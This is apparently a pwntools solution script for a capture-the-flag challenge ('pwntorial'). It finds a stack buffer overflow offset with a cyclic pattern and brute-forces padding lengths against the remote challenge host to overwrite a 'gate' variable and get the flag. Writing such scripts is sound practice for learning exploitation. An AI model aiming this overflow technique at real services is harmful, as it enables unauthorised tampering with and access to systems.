from pwn import *

context.update(arch='amd64', os='linux', log_level='info')

EXE  = "./pwnable"       # local binary, if you have it, for offset-finding
HOST = "broncoctf-pwntorial.chals.io"
PORT = 443

LOCAL = False

def get_io():
    if LOCAL:
        return process(EXE)
    return remote(HOST, PORT, ssl=True, sni=HOST)

def find_offset():
    """
    Only works if you have the local binary + gdb/pwndbg.
    Sends a cyclic pattern, crashes/misbehaves the program,
    and you read the value that landed in `gate` from a core
    dump or gdb to find the exact offset before the pattern
    that flips it. If you don't have the binary, skip this and
    just try candidate offsets (64, 68, 72, 76...) directly on
    the remote using try_offset() below.
    """
    payload = cyclic(200)
    io = process(EXE)
    io.sendline(payload)
    io.wait()
    core = io.corefile
    gate_val = core.read(core.esp, 4)  # adjust register/address as needed
    offset = cyclic_find(gate_val)
    log.info(f"Offset found: {offset}")
    return offset

def try_offset(padding):
    """
    Send buffer_size + padding of 'A', then 4+ junk bytes for gate,
    and see if we win.
    """
    payload = b'A' * padding + b'B' * 8   # extra bytes for alignment safety
    io = get_io()
    io.sendline(payload)
    out = io.recvall(timeout=3)
    io.close()
    return out

if __name__ == "__main__":
    # Strategy: since we can't inspect the remote binary directly here,
    # brute force a handful of likely offsets (64 is the buffer size from
    # the source, but stack alignment can push the real offset to 64, 72,
    # or 80 depending on how the compiler laid things out).
    for padding in [64, 68, 72, 76, 80, 88, 96]:
        log.info(f"Trying padding = {padding}")
        result = try_offset(padding)
        print(result.decode(errors="replace"))
        if b"win" in result.lower() or b"flag" in result.lower() or b"congrat" in result.lower():
            log.success(f"Likely hit at padding={padding}")
            break

    # Once you find the working padding, replace the loop above with a
    # single clean run:
    #
    # payload = b'A' * WORKING_PADDING + b'B' * 8
    # io = get_io()
    # io.sendline(payload)
    # io.interactive()
